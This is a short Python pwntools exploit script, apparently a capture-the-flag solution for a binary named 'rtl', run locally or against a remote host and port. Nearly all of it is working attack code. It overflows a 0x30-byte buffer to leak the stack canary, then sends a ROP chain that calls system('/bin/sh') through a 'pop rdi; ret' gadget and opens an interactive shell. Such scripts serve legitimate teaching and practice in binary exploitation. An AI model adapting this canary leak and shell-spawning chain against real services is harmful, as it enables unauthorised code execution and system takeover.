from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-gef
break main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './rtl'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
#context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True
context.arch = elf.arch

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
context.log_level = 'debug'
rop = ROP(elf)
p.recvuntil(b'Buf: ')
payload1= b'A'*(0x30+8)
p.sendline(payload1)
p.recvuntil(b'Buf: ')
p.recv(0x38)
canary = u64(p.recv(8)) - 0x0a
info('canary: ' + hex(canary))
payload2 = b'A'*(0x30+8) + p64(canary) + p64(0xdeadbeef) + p64(rop.find_gadget(['pop rdi', 'ret']).address) + p64(next(elf.search(b'/bin/sh\x00'))) +p64(0x0000000000400285) + p64(elf.plt['system'])
p.sendline(payload2)
p.interactive()